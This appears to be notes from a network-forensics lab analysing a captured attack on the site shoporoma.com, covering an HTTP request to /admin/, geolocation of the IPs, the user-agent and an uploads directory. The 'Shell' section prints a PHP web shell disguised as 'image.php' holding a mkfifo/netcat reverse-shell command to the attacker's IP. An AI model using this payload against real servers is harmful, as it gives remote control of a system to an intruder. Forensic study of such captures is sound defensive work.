# Packet Trace

Frame 93: 409 bytes on wire (3272 bits), 409 bytes captured (3272 bits)
Ethernet II, Src: VMware_c0:00:09 (00:50:56:c0:00:09), Dst: VMware_61:97:cd (00:0c:29:61:97:cd)
Internet Protocol Version 4, Src: 117.11.88.124, Dst: 24.49.63.79
Transmission Control Protocol, Src Port: 59350, Dst Port: 80, Seq: 1, Ack: 1, Len: 343
Hypertext Transfer Protocol
    GET /admin/ HTTP/1.1\r\n
    Host: shoporoma.com\r\n
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n
    Accept-Language: en-US,en;q=0.5\r\n
    Accept-Encoding: gzip, deflate\r\n
    Connection: keep-alive\r\n
    Upgrade-Insecure-Requests: 1\r\n
    \r\n
    [Full request URI: http://shoporoma.com/admin/]
    [HTTP request 1/1]
    [Response in frame: 95]

## 1. City
Source

IP Address: 117.11.88.124
Country: China
Region: Tianjin
City: Tianjin
ISP: China Unicom Tianjin Province Network
Organization: Not available
Latitude: 39.1422
Longitude: 117.1761

Destination


IP Address: 24.49.63.79
Country: United States
Region: Maryland
City: Hagerstown
ISP: Antietam Broadband
Organization: Not available
Latitude: 39.6418
Longitude: -77.7181


Internet Protocol Version 4, Src: 117.11.88.124, Dst: 24.49.63.79

## 2. User-agent

Hypertext Transfer Protocol
    GET /admin/ HTTP/1.1\r\n
    Host: shoporoma.com\r\n
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n
    [Full request URI: http://shoporoma.com/admin/]
    [HTTP request 1/1]
    [Response in frame: 95]


## 3. Shell


"image.php"                                14--..

Uploads an php script disguising as php
used 2   <?php system ("r
  m /tmp/f;mkfifo 
  /tmp/f;cat /tmp/
 f|/bin/sh -i 2>&
  1|nc 117.11.88.1
  24 8080 >/tmp/f"
   ); ?>...--------

nc to start reverse shell


## 4. Directory

/reviews